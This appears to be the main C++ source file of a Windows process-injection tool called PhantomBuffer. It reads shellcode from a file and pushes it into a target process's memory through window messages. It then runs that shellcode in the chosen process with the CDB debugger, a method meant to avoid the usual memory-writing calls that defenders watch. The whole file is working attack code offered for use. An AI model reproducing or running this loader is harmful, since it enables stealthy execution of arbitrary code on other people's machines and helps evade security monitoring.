#include <windows.h>
#include <iostream>
#include "MsgInject.h"
#include "PayloadExec.h"

int main(int argc, char* argv[])
{
    //Running as normal application
    std::cout << "\nPhantomBuffer: Send buffers without Writing\n"
        << "\nGitHub:  https://github.com/TwoSevenOneT/PhantomBuffer\n"
        << "\nTwo Seven One Three: https://x.com/TwoSevenOneT\n"
        << "\n==========================================================\n\n";


    if (argc < 5)
    {
        std::cerr << "Usage: " << argv[0] << " <PID> <HWND: 0xXXXXXXXX> <SC_FilePath> <CDB.exe Path>\n";
        return 1;
    }
    DWORD processId = static_cast<DWORD>(std::stoul(argv[1]));
    unsigned long long hwndValue = std::stoull(argv[2], nullptr, 16);
    HWND hWnd = reinterpret_cast<HWND>(static_cast<UINT_PTR>(hwndValue));
    std::string filePath = argv[3];
    std::vector<uint8_t> payload = ReadSCFromFile(filePath.c_str());
	std::string cdbPathA = argv[4];
	std::wstring cdbPath(cdbPathA.begin(), cdbPathA.end());
 //   // MUST REPLACE THIS
 //   unsigned char rawData[8] = {
 //   0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC
 //   };
 //   //

	//payload.insert(payload.begin(), rawData, rawData + sizeof(rawData));
 //   if (payload.size() == 0)
 //   {
 //       std::cerr << "Read SC from file failed. File path:  " << filePath << std::endl;
 //       return 0;
 //   }
    std::cout << "Read SC OK!" << std::endl;
    if (!SendMsg(hWnd, payload.data()))
    {
        std::cerr << "SendMsg failed. Data size:  " << payload.size() << std::endl;
        return 0;
    }
    std::cout << "Send MSG OK!" << std::endl;
    
    if (!ExecuteSC(processId, payload, cdbPath))
    {
        std::cerr << "ExecuteSC failed. PID:  " << processId << std::endl;
        return 0;
    }
    std::cout << "Everything OK!" << std::endl;
    return 0;
    //
}

